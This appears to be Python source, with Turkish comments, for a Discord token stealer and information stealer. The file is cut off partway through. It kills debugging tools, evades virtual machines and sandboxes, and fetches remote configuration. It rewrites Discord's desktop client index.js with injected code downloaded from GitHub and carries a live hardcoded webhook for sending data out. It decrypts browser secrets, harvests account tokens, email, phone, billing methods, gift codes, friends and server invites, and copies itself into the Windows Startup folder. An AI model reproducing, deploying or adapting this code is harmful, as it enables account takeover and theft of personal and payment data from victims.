import os         # İşletim sistemi işlemleri için
import re         # Düzenli ifadeler için
import sys        # Python sistem parametreleri ve fonksiyonları için
import time       # Zaman işlemleri için
import shutil     # Dosya ve dizin işlemleri için
import ctypes     # Windows API'leri kullanmak için
import winreg     # Windows kayıt defteri işlemleri için
import requests   # HTTP istekleri yapmak için
import urllib     # URL işlemleri için
import random     # Rastgele sayı üretmek için
import warnings   # Uyarı mesajlarını kontrol etmek için
import threading  # İş parçacığı (thread) işlemleri için
import subprocess # Alt işlem (subprocess) yönetimi için

from sys import executable, stderr  # Python yürütücüsü ve hata çıkışı için
from base64 import b64decode       # Base64 kodlamasını çözmek için
from json import loads, dumps      # JSON işlemleri için
from zipfile import ZipFile, ZIP_DEFLATED  # ZIP dosyalarıyla işlem yapmak için
from sqlite3 import connect as sql_connect  # SQLite veritabanına bağlanmak için
from urllib.request import Request, urlopen  # URL istekleri yapmak için (Python 3.x)
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer  # Windows API'lerini kullanmak için


# NullWriter sınıfı, write metodu ile gelen argümanları hiçbir şey yapmadan geçer.
class NullWriter(object):
    def write(self, arg):
        pass


warnings.filterwarnings("ignore")
# NullWriter'ı kullanarak stderr çıktısını yok ediyoruz.
null_writer = NullWriter()
stderr = null_writer

# ======================== Modül Yönetimi - Aşama 1 ======================== #

# ModuleRequirements listesi, gereken modüllerin ve bunların yüklenmesi gereken isimlerinin listesini içerir.
ModuleRequirements = [
    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
]

for module in ModuleRequirements:
    try: 
        __import__(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(3)

from Crypto.Cipher import AES # yukarıyı incele

for module in ModuleRequirements:
    try: 
        # Modülü mevcut ortamda kontrol ediyoruz.
        __import__(module[0])
    except:
        # Modül bulunamazsa, pip aracılığıyla ilgili modülü yüklemek için subprocess kullanıyoruz.
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        # Yükleme işleminden sonra bir süre bekliyoruz.
        time.sleep(3)

# Şimdi ise Crypto.Cipher modülünden AES sınıfını projemize dahil ediyoruz.
from Crypto.Cipher import AES


# ======================== Anti-Debugging ve VM Tespiti - Aşama 2 ======================== #

# Bir anti-debugging işlevi tanımlar. Birkaç kontrol fonksiyonunu (check_windows, check_ip, check_registry, check_dll) bir listeye ekler ve her birini ayrı bir iş parçacığında çalıştırır.
def antidebug():
    checks = [check_windows, check_ip, check_registry, check_dll]
    for check in checks:
        t = threading.Thread(target=check, daemon=True)
        t.start()

# Programı belirtilen bir nedenle sonlandırır ve nedeni yazdırır.
def exit_program(reason):
    print(reason)
    ctypes.windll.kernel32.ExitProcess(0)

# Bir anti-debugging işlevi tanımlar ve bazı debugger araçlarını algılar. Bu araçlar algılandığında, ilgili işlemi sonlandırır.
def check_windows():
    # WINFUNCTYPE: Bir C işlevi işaretçisi türü oluşturur.
    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
    def winEnumHandler(hwnd, ctx):
        # Pencere başlığını almak için bir buffer oluşturur.
        title = ctypes.create_string_buffer(1024)
        # Pencere başlığını alır.
        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
        if title.value.decode('Windows-1252').lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'cse pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'http toolkit', 'george',}:
            # Pencere işlem kimliğini alır.
            pid = ctypes.c_ulong(0)
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid.value != 0:
                try:
                    # İşlem tanıtıcısını açar ve işlemi sonlandırır.
                    handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
                    ctypes.windll.kernel32.TerminateProcess(handle, -1)
                    ctypes.windll.kernel32.CloseHandle(handle)
                except:
                    pass
            # Programı belirli bir neden ile sonlandırır.
            exit_program(f'Debugger Open, Type: {title.value.decode("utf-8")}')
        return True

    while True:
        # Tüm pencereleri enumerate eder ve her bir pencere için winEnumHandler işlevini çağırır.
        ctypes.windll.user32.EnumWindows(winEnumHandler, None)
        # 0.5 saniye bekler.
        time.sleep(0.5)

# IP adreslerini kontrol eden bir işlev tanımlar ve belirli bir kara listedeki IP'leri algılarsa programı sonlandırır.
def check_ip():
    # Kara listeye alınmış IP adresleri.
    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228', None}    
    while True:
        try:
            # IP adresini alır.
            ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
            # IP adresi kara listedeyse programı sonlandırır.
            if ip in blacklisted:
                exit_program('Blacklisted IP Detected')
            return
        except:
            pass

# Kayıt defteri (registry) anahtarlarını kontrol eden bir işlev tanımlar ve belirli bir anahtar bulunursa programı sonlandırır.
def check_registry():
    try:
        # Kayıt defteri anahtarını açar.
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
        subkey_count = winreg.QueryInfoKey(key)[0]
        for i in range(subkey_count):
            # Alt anahtarları enumerate eder.
            subkey = winreg.EnumKey(key, i)
            if subkey.startswith('VMWARE'):
                exit_program('VM Detected')
        winreg.CloseKey(key)
    except:
        pass

# Belirli DLL dosyalarının varlığını kontrol eden bir işlev tanımlar ve bu dosyalar varsa programı sonlandırır.
def check_dll():
    # Sistem kök dizinini alır.
    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
    # Belirtilen DLL dosyalarının varlığını kontrol eder.
    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
        # VM tespit edilirse programı sonlandırır.
        exit_program('VM Detected')

# ======================== Değişken ve Kod Enjeksiyonu - Aşama 3 ======================== #

# Belirtilen URL'den veriyi alır ve değişkene atar.
cname = "https://rentry.co/6zrwdqyr/raw" 
cnameresp = requests.get(cname)
cname = cnameresp.text
# Küçük cname URL'sinden veriyi alır ve değişkene atar.
smallcname = "https://rentry.co/6zrwdqyr/raw"
smallcnameresp = requests.get(smallcname)
smallcname = smallcnameresp.text
# Footer URL'sinden veriyi alır ve değişkene atar.
footerc = "https://rentry.co/mo6mytgi/raw"
footercresp = requests.get(footerc)
footerc = footercresp.text
# Kelimeler URL'sinden veriyi alır ve değişkene atar.
words = "https://rentry.co/5uu99/raw"
wordsresp = requests.get(words)
words = wordsresp.text

# Discord webhook URL'si.
h00k = "https://discord.com/api/webhooks/1265655617520144486/fyQaxGcb9KZ1sw27h5jgfi7fuDN5JD8cbiG2VibGUcW43s7Lr9vyDz0kbeK3CAmtiHix"
# cname değişkenini kullanarak enjeksiyon URL'sini oluşturur.
inj3c710n_url = f"https://raw.githubusercontent.com/wtf{cname}wtf/index/main/injection.js"


# ======================== Değişken ve Kod Enjeksiyonu - Aşama 3 ======================== #

# Verinin boyutunu ve veriyi içeren bir yapı tanımlar.
class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

# IP adresini almak için bir işlev tanımlar.
def G371P():
    try:
        return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        return "None"

# Belirtilen klasörü zip dosyasına dönüştüren bir işlev tanımlar.
def Z1PF01D3r(foldername, target_dir):            
    zipobj = ZipFile(temp+"/"+foldername + '.zip', 'w', ZIP_DEFLATED)
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            if not "user_data" in fn:
                zipobj.write(fn, fn[rootlen:])

# Verilen DATA_BLOB yapısından ham veriyi çıkaran bir işlev tanımlar.
def G37D474(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

# Şifrelenmiş veriyi çözmek için bir işlev tanımlar.
def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G37D474(blob_out)

# Şifrelenmiş bir değeri çözen bir işlev tanımlar.
def D3CrYP7V41U3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16]
        try:
            decrypted_pass = decrypted_pass.decode()
        except:
            pass
        return decrypted_pass

# Belirtilen URL'ye veri göndermek için bir işlev tanımlar. Başarı sağlanana kadar denemeler yapar.
def L04DUr118(h00k, data='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(h00k, data=data, headers=headers))
            else:
                r = urlopen(Request(h00k, data=data))
            return r
        except: 
            pass

# Kullanıcının IP adresi ve ülkesine dair bilgileri toplayarak formatlar.
def G108411NF0():
    try:
        # Çevresel değişkenden kullanıcı adını alır.
        username = os.getenv("USERNAME")
        # IP adresi bilgilerini JSONP formatından alır ve JSON formatına dönüştürür.
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{IP}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
        contry = ipdata["country_name"]
        contryCode = ipdata["country_code"].lower()
        if contryCode == "not found":
            globalinfo = f":rainbow_flag:  - `{username.upper()} | {IP} ({contry})`"
        else:
            globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {IP} ({contry})`"
        return globalinfo

    except:
        return f":rainbow_flag:  - `{username.upper()}`"


# Belirtilen çerezlerin içinde belirli bir URL'yi kontrol eden bir işlev tanımlar.
def TrU57(C00K13s):
    global DETECTED
    # Çerezleri stringe dönüştürür.
    data = str(C00K13s)
    # Çerez verisinde ".google.com" ile eşleşen tüm örnekleri bulur.
    tim = re.findall(".google.com", data)
    # Eğer ".google.com" bulunan örnek sayısı birden fazla ise DETECTED'ı True yapar.
    DETECTED = True if len(tim) < -1 else False
    return DETECTED


# Discord uygulamalarının belirli klasörlerinde `index.js` dosyasını değiştiren bir işlev tanımlar.
def inj3c710n():
    # Kullanıcı adını alır.
    username = os.getlogin()
    # Kontrol edilecek klasörlerin listesi.
    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']
    # Her bir klasör adını kontrol eder.
    for folder_name in folder_list:
        # Belirli bir klasör yolunu oluşturur.
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            # Klasör içinde gezinir.
            for subdir, dirs, files in os.walk(deneme_path):
                # 'app-' içeren alt dizinleri kontrol eder.
                if 'app-' in subdir:
                    for dir in dirs:
                        # 'modules' içeren alt dizinleri kontrol eder.
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                # 'discord_desktop_core-' içeren alt dizinleri kontrol eder.
                                if 'discord_desktop_core-' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        # 'discord_desktop_core' içeren alt dizinleri kontrol eder.
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                # `index.js` dosyasını bulur ve içerini değiştirir.
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)
                                                    # Enjeksiyon kodunu URL'den alır.
                                                    injeCTmED0cT0r_cont = requests.get(inj3c710n_url).text
                                                    # Webhook URL'sini içeriğe ekler.
                                                    injeCTmED0cT0r_cont = injeCTmED0cT0r_cont.replace("%WEBHOOK%", h00k)
                                                    # Dosyayı yazma modunda açar ve içeriği yazar.
                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(injeCTmED0cT0r_cont)
# Enjeksiyon işlevini çağırır.
inj3c710n()

# Discord API'sini kullanarak kullanıcıya ait promo kodlarını ve Nitro kodlarını almak için bir işlev tanımlar.
def G37C0D35(token):
    try:
        codes = ""  # Kodları biriktirmek için boş bir string oluşturur.
        # Discord API'ye istek göndermek için gerekli başlıkları tanımlar.
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        # Kullanıcının outbound (dışa dönük) promosyon kodlarını alır.
        codess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", headers=headers)).read().decode())
        # Her bir promosyon kodunu kodlar stringine ekler.
        for code in codess:
            try:
                codes += f"<:black_gift:1184971095003107451> **{str(code['promotion']['outbound_title'])}**\n<:Rightdown:891355646476296272> `{str(code['code'])}`\n"
            except:
                pass
        # Kullanıcının Nitro kodlarını alır.
        nitrocodess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB", headers=headers)).read().decode())
        # Eğer Nitro kodu yoksa mevcut kodları döndürür.
        if nitrocodess == []:
            return codes
        # Her bir Nitro kodu için detayları alır ve kodları kodlar stringine ekler.
        for element in nitrocodess:
            sku_id = element['sku_id']
            subscription_plan_id = element['subscription_plan']['id']
            name = element['subscription_plan']['name']
            # Nitro kodlarının URL'sini oluşturur.
            url = f"https://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id={sku_id}&subscription_plan_id={subscription_plan_id}"
            nitrrrro = loads(urlopen(Request(url, headers=headers)).read().decode())
            for el in nitrrrro:
                cod = el['code']
                try:
                    codes += f"<:black_gift:1184971095003107451> **{name}**\n<:Rightdown:891355646476296272> `https://discord.gift/{cod}`\n"
                except:
                    pass
        return codes
    except:
        return ""

# Discord API'sini kullanarak kullanıcının ödeme yöntemlerini kontrol eden bir işlev tanımlar.
def G3781111N6(token):
    # API istekleri için gerekli başlıkları tanımlar.
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        # Kullanıcının ödeme kaynaklarını alır.
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False  # API isteği başarısız olursa False döndürür.
    # Eğer ödeme kaynakları boşsa "`None`" döndürür.
    if billingjson == []:
        return "`None`"
    billing = ""
    # Her bir ödeme kaynağını kontrol eder.
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"  # Kredi kartı varsa simge ekler.
            elif methode["type"] == 2:
                billing += ":parking: "  # Diğer bir ödeme yöntemi varsa simge ekler.
    return billing  # Ödeme yöntemlerini simgelerle birlikte döndürür.

# Kullanıcının sahip olduğu Discord rozetlerini belirli bir bayrak değeri kullanarak döndüren bir işlev tanımlar.
def G3784D63(flags):
    # Eğer bayrak değeri 0 ise boş bir string döndürür.
    if flags == 0:
        return ''
    OwnedBadges = ''  # Kullanıcının sahip olduğu rozetleri biriktirmek için boş bir string oluşturur.
    # Discord rozetlerini tanımlar. Her bir rozetin adı, değeri ve emojisi vardır.
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]
    # Bayrak değerine göre hangi rozetlerin kullanıcıda olduğunu belirler.
    for badge in badgeList:
        if flags // badge["Value"] != 0:  # Rozet değeri bayrak değerinden çıkartılabiliyorsa
            OwnedBadges += badge["Emoji"]  # Rozet emojisini ekler
            flags = flags % badge["Value"]  # Bayrak değerini günceller
    return OwnedBadges  # Kullanıcının sahip olduğu rozetlerin emojilerini döndürür.

# Kullanıcının arkadaş listesinde, belirli rozetlere sahip olan ve yüksek profilli (HQ) olan arkadaşları döndüren bir işlev tanımlar.
def G37UHQFr13ND5(token):
    # Discord rozetlerini tanımlar. Her bir rozetin adı, değeri ve emojisi vardır.
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]
    # HTTP isteklerinde kullanılacak başlıkları tanımlar.
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        # Kullanıcının arkadaş listesini çeker.
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False  # Hata durumunda False döndürür.
    uhqlist = ''  # HQ arkadaşlarının bilgilerini biriktirmek için boş bir string oluşturur.
    # Her bir arkadaş için
    for friend in friendlist:
        OwnedBadges = ''  # Arkadaşın sahip olduğu rozetleri biriktirmek için boş bir string oluşturur.
        flags = friend['user']['public_flags']  # Arkadaşın sahip olduğu rozetlerin bayrak değerlerini alır.
        for badge in badgeList:
            # Eğer rozet bayrağı arkadaşın sahip olduğu bayrak değerinde bulunuyorsa ve arkadaş bir kullanıcı ise
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                # "House" ile ilgili rozetler ve "Active_Developer" dışındaki rozetleri ekler.
                if not "House" in badge["Name"] and not badge["Name"] == "Active_Developer":
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]  # Bayrak değerini günceller.
        # Eğer arkadaşın sahip olduğu rozetler varsa, bunları ve arkadaşın bilgilerini ekler.
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | **{friend['user']['username']}#{friend['user']['discriminator']}** `({friend['user']['id']})`\n"
    # HQ arkadaşları varsa bilgilerini döndürür, aksi takdirde "No HQ Friends Found" mesajını döndürür.
    return uhqlist if uhqlist != '' else "`No HQ Friends Found`"


def G37UHQ6U11D5(token):
    try:
        uhqguilds = ''  # Yüksek profilli (HQ) sunucuları biriktirmek için boş bir string oluşturur.
        headers = {
            "Authorization": token,  # Discord API'ye erişim için yetkilendirme başlığı.
            "Content-Type": "application/json",  # JSON veri formatı için başlık.
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"  # Tarayıcı bilgisi.
        }
        # Kullanıcının katıldığı sunucuları alır.
        guilds = loads(urlopen(Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)).read().decode())
        # Her bir sunucu için
        for guild in guilds:
            # Üye sayısı 1'den az olan sunucuları atlar.
            if guild["approximate_member_count"] < 1: continue
            # Sunucu sahibi ya da yönetim izinlerine sahip ise
            if guild["owner"] or guild["permissions"] == "4398046511103":
                # Sunucunun davet bağlantılarını alır.
                inv = loads(urlopen(Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)).read().decode())
                try:
                    # İlk davet bağlantısını alır ve URL'yi oluşturur.
                    cc = "https://discord.gg/" + str(inv[0]['code'])
                except:
                    # Davet bağlantısı yoksa False döndürür.
                    cc = False
                # Sunucu adı ve üye sayısını ekler.
                uhqguilds += f"<:blackarrow:1095740975197995041> [{guild['name']}] **{str(guild['approximate_member_count'])} Members**\n"
        # Eğer HQ sunucuları bulunamazsa uygun bir mesaj döndürür.
        if uhqguilds == '':
            return '`No HQ Guilds Found`'
        return uhqguilds
    except:
        # Hata durumunda uygun bir mesaj döndürür.
        return 'No HQ Guilds Found'

def G3770K3N1NF0(token):
    headers = {
        "Authorization": token,  # Discord API'ye erişim için yetkilendirme başlığı.
        "Content-Type": "application/json",  # JSON veri formatı için başlık.
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"  # Tarayıcı bilgisi.
    }
    # Kullanıcı bilgilerini alır.
    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    # Kullanıcı bilgilerini çıkarır.
    username = userjson["username"]  # Kullanıcının kullanıcı adı.
    hashtag = userjson["discriminator"]  # Kullanıcının etiket numarası.
    email = userjson["email"]  # Kullanıcının e-posta adresi.
    idd = userjson["id"]  # Kullanıcının Discord ID'si.
    pfp = userjson["avatar"]  # Kullanıcının profil fotoğrafı ID'si.
    flags = userjson["public_flags"]  # Kullanıcının açık bayrakları (rozetleri).
    nitro = ""  # Nitro bilgisi.
    phone = ""  # Telefon numarası.
    # Nitro türünü kontrol eder.
    if "premium_type" in userjson:
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "  # Nitro Classic.
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "  # Nitro Boost + Classic.
    # Telefon numarasını kontrol eder.
    if "phone" in userjson:
        phone = f'`{userjson["phone"]}`' if userjson["phone"] is not None else "`None`"
    # Kullanıcı bilgilerini döndürür.
    return username, hashtag, email, idd, pfp, flags, nitro, phone

def CH3CK70K3N(token):
    headers = {
        "Authorization": token,  # Discord API'ye erişim için yetkilendirme başlığı.
        "Content-Type": "application/json",  # JSON veri formatı için başlık.
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"  # Tarayıcı bilgisi.
    }
    try:
        # Discord API'ye istek gönderir ve yanıtı kontrol eder.
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True  # Token geçerliyse True döner.
    except:
        return False  # Token geçersizse False döner.


# Eğer betik bir 'frozen' durumdaysa (örneğin bir .exe dosyası olarak paketlenmişse)
# 'sys.executable' kullanılır, aksi takdirde betik normal bir Python dosyasıdır ve '__file__' kullanılır.
if getattr(sys, 'frozen', False):
    # Paketlenmiş durumda: betiğin bulunduğu dizini alır
    currentFilePath = os.path.dirname(sys.executable)
else:
    # Normal durumda: betiğin bulunduğu dizini alır
    currentFilePath = os.path.dirname(os.path.abspath(__file__))
# Komut satırından geçirilen dosya adını alır
fileName = os.path.basename(sys.argv[0])
# Mevcut dosyanın tam yolunu oluşturur
filePath = os.path.join(currentFilePath, fileName)
# Windows başlangıç klasörünün yolunu oluşturur
startupFolderPath = os.path.join(
    os.path.expanduser('~'),  # Kullanıcının ev dizini
    'AppData', 'Roaming',      # AppData dizini
    'Microsoft', 'Windows',    # Microsoft ve Windows dizinleri
    'Start Menu', 'Programs',  # Start Menu ve Programs dizinleri
    'Startup'                  # Startup klasörü
)
# Başlangıç klasöründeki dosyanın tam yolunu oluşturur
startupFilePath = os.path.join(startupFolderPath, fileName)
# Eğer mevcut dosya yolu, başlangıç klasöründeki dosya yolundan farklıysa
if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    # Dosyayı başlangıç klasörüne kopyalar
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)


def Tr1M(obj):
    # Eğer 'obj' değişkeninin uzunluğu 1000 karakterden uzunsa
    if len(obj) > 1000:
        # 'obj' değişkenini satırlara böler
        f = obj.split("\n")
        obj = ""
        # Her satırı kontrol eder
        for i in f:
            # Eğer mevcut 'obj' uzunluğu, 1000 karaktere yaklaşmışsa
            if len(obj) + len(i) >= 1000:
                # 'obj' değişkenine "..." ekler ve döngüyü kırar
                obj += "..."
                break
            # Aksi takdirde, satırı 'obj' değişkenine ekler
            obj += i + "\n"
    # Kısaltılmış veya orijinal 'obj' değerini döner
    return obj


def UP104D70K3N(token, path):
    # Global değişkenleri kullan
    global h00k
    
    # Discord API için gerekli başlıkları ayarla
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    # Token kullanarak kullanıcı bilgilerini al
    username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)

    # Profil fotoğrafı URL'sini belirle, yoksa varsayılan bir URL kullan
    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"

    # Kullanıcıya ait diğer bilgileri al
    billing = G3781111N6(token)         # Ödeme yöntemleri
    badge = G3784D63(flags)             # Rozetler
    friends = Tr1M(G37UHQFr13ND5(token))  # HQ arkadaşlar
    guilds = Tr1M(G37UHQ6U11D5(token))  # HQ sunucular
    codes = Tr1M(G37C0D35(token))       # Hediye kodları

    # Bilgiler eksikse varsayılan değerler ayarla
    if codes == "": codes = "`No Gifts Found`"
    if billing == "": billing = ":lock:"
    if badge == "" and nitro == "": badge, nitro = ":lock:", ""
    if phone == "": phone = "`None`"
    if friends == "": friends = ":lock:"
    if guilds == "": guilds = ":lock:"

    # Dosya yolundaki ters eğik çizgileri düzelt
    path = path.replace("\\", "/")

    # Webhook'a gönderilecek veri yapısını oluştur
    data = {
        "content": f'{GLINFO} **Found in** `{path}`',
        "embeds": [
            {
                "color": 2895667,  # Embed rengini belirle
                "fields": [
                    {
                        "name": "<:hackerblack:1095747410539593800> Token:",
